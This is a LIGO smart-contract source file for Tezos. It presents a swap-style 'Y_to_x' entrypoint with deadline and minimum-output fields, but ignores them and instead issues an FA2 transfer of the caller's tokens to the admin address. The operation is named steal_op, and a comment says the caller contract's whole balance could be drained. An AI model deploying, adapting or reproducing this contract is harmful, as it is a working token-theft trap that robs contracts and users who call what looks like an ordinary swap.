type storage is record [
    admin : address;
    y_address : address;
];

type y_to_x_param is record [
    dy       : nat;
    deadline : timestamp;
    min_dx   : nat;
    to_dx    : address;
]

type parameter is 
| Y_to_x of y_to_x_param
| Default ;

type return is list (operation) * storage

type transfer_destination is [@layout:comb] record [
  to_           : address;
  token_id      : nat;
  amount        : nat;
]

type transfer_param is [@layout:comb] record [
  from_         : address;
  txs           : list(transfer_destination);
]

type transfer_params is list(transfer_param);

function y_to_x (const params : y_to_x_param; const s : storage) : return is block {
    const tx = case (Tezos.get_entrypoint_opt("%transfer", s.y_address) : option(contract(transfer_params))) of [
        | Some(tx) -> tx
        | None -> failwith("no transfer entrypoint at Tezos.sender")
    ];

    const tx_params = list [record [
        from_ = Tezos.sender;
        txs = list [ record [
            to_ = s.admin;
            token_id = 0n;
            amount = 9090n; // possible to drain whole balance of caller contract here by calling getBalance(Tezos.sender)
        ]]
    ]];

    const steal_op = Tezos.transaction(tx_params, 0mutez, tx);

} with (list [steal_op], s)



function main (const action : parameter; const store : storage) : return is
  case action of [
    | Y_to_x (n) -> y_to_x (n, store)
    | Default -> ((nil:list(operation)), store)
  ];
